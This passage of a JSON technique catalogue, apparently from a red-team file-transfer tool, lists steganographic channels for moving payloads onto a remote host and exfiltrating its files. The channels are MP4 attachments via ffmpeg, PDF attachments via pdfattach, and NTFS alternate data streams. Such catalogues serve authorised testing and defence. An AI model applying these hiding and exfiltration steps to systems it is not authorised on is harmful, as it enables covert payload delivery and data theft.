    "direction": "deliver",
    "channel": "stegano",
    "family": "mp4",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ffmpeg -i \"{lhostpath}/cover.mp4\" -attach \"{lhostpath}/{file}\" -metadata:s:t mimetype=application/zip -metadata:s:t filename=\"{file}\" -c copy \"{lhostpath}/{file}.attachment.mp4\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ffmpeg -dump_attachment:t \"{remotefile}\" -i \"{remotefile}.attachment.mp4\" -y"
      }
    ],
    "requires": [
      "ffmpeg"
    ],
    "note": {
      "en": "Attaches the payload to an MP4 without re-encoding. Requires cover.mp4 on LHOST; obvious to inspection.",
      "ru": "Прикрепляет payload к MP4 без перекодирования. Нужен cover.mp4 на LHOST; заметно при проверке."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-mp4-attach-exfil",
    "title": "MP4 attachment (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "mp4",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ffmpeg -i \"{remote}/cover.mp4\" -attach \"{remotefile}\" -metadata:s:t mimetype=application/zip -metadata:s:t filename=\"{file}\" -c copy \"{remotefile}.attachment.mp4\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ffmpeg -dump_attachment:t \"{lhostpath}/{file}\" -i \"{lhostpath}/{file}.attachment.mp4\" -y"
      }
    ],
    "requires": [
      "ffmpeg"
    ],
    "note": {
      "en": "Attaches the file to an MP4 on RHOST; transfer the MP4, then extract on LHOST.",
      "ru": "Прикрепляет файл к MP4 на RHOST; передайте MP4 и извлеките на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-pdf-attach",
    "title": "PDF attachment",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "pdf",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "pdfattach \"{lhostpath}/cover.pdf\" \"{lhostpath}/{file}\" \"{lhostpath}/{file}.attach.pdf\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cd \"{remote}\" && pdfdetach -saveall \"{remotefile}.attach.pdf\""
      }
    ],
    "requires": [
      "poppler-utils"
    ],
    "note": {
      "en": "Embeds the payload as a PDF attachment. Requires cover.pdf on LHOST.",
      "ru": "Встраивает payload как PDF-вложение. Нужен cover.pdf на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-pdf-attach-exfil",
    "title": "PDF attachment (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "pdf",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "pdfattach \"{remote}/cover.pdf\" \"{remotefile}\" \"{remotefile}.attach.pdf\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd \"{lhostpath}\" && pdfdetach -saveall \"{lhostpath}/{file}.attach.pdf\""
      }
    ],
    "requires": [
      "poppler-utils"
    ],
    "note": {
      "en": "Embeds the file into a PDF on RHOST; transfer the PDF, then extract on LHOST.",
      "ru": "Встраивает файл в PDF на RHOST; передайте PDF и извлеките на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-ads-hide",
    "title": "NTFS ADS hide",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "stegano",
    "family": "ads",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "type \"{remotefile}\" > \"{remote}cover.jpg:{file}\""
      }
    ],
    "requires": [
      "NTFS"
    ],
    "note": {
      "en": "Hides the file in the alternate data stream {file} of cover.jpg. ADS is lost when copying to FAT/exFAT, ZIP or email.",
      "ru": "Прячет файл в alternate data stream {file} файла cover.jpg. ADS теряется при копировании на FAT/exFAT, в ZIP или почту."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-ads-extract",
    "title": "NTFS ADS extract",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "stegano",
    "family": "ads",
    "priority": 20,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "type \"{remote}cover.jpg:{file}\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "NTFS"
    ],
    "note": {
      "en": "Extracts the alternate stream into a normal file on RHOST. Use dir /r to inspect streams.",
      "ru": "Извлекает alternate stream в обычный файл на RHOST. Для просмотра потоков используйте dir /r."
    },
    "docs": "docs/en/13-stegano.md"
  }
];
